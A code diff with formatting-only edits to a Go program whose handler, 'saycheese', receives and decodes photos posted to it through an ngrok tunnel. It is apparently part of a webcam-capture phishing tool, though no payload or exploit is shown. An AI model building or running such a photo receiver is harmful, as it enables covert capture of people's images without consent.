@@ -17,7 +17,7 @@ import (
 )
 
 var (
-	cono        int            = 0                                                   // this is for avoid problems
+	cono        int            = 0                                                  // this is for avoid problems
 	detectNgrok *regexp.Regexp = regexp.MustCompile("https://+[a-z 0-9]+.ngrok.io") // this is the regex for get the url
 
 	logo string = "" +
@@ -47,12 +47,10 @@ var (
 		"   00:1G  GGG| 0|      \n"
 )
 
-
-func saycheese(w http.ResponseWriter, r *http.Request) {
+func saycheese(_ http.ResponseWriter, r *http.Request) {
 	log.Println("\nNew photo")
 	// decode the bodyrequest
 	var conf map[string]string
-
 
 	json.NewDecoder(r.Body).Decode(&conf)
 
@@ -61,6 +59,7 @@ func saycheese(w http.ResponseWriter, r *http.Request) {
 	if err != nil {
 		fmt.Println("fuck", err)
 	}
+	
 	//  to bytes
 	d := bytes.NewReader(imageData)
 	// decode the image
